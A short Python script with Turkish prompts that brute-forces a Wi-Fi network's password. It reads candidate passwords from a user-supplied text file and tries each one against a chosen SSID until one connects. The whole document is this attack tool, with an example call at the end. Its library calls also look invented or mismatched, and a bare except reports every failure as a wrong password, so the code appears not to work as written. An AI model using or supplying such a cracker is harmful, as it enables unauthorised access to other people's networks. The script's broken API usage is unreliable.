import wifi

def connect_to_wifi():
    ssid = input("Ağ adını (SSID) girin: ")
    password_file = input("Şifre listesini içeren txt dosyasının adını giriniz: ")
    connected = False
    with open(password_file, 'r') as f:
        password_list = f.read().splitlines()
    for password in password_list:
        try:
            # WiFi ağlarını tarama
            wifi_list = wifi.Cell.all('wlan0')
            # Ağ adını arama
            desired_network = None
            for network in wifi_list:
                if network.ssid == ssid:
                    desired_network = network
                    break
            if not desired_network:
                print("Ağ bulunamadı")
                return

            # Bağlantıyı yap
            auth = wifi.AuthHandler()
            auth.configure(desired_network, wifi.WEP, password)
            wifi.Cell.add_handler(auth)
            wifi.Cell.connect(desired_network)
            print("Bağlantı Başarılı")
            connected = True
            break
        except:
            print(f"{password} şifresi yanlış")
            if not connected:
                print("Bağlantı Başarısız")

# Örnek kullanım
connect_to_wifi()
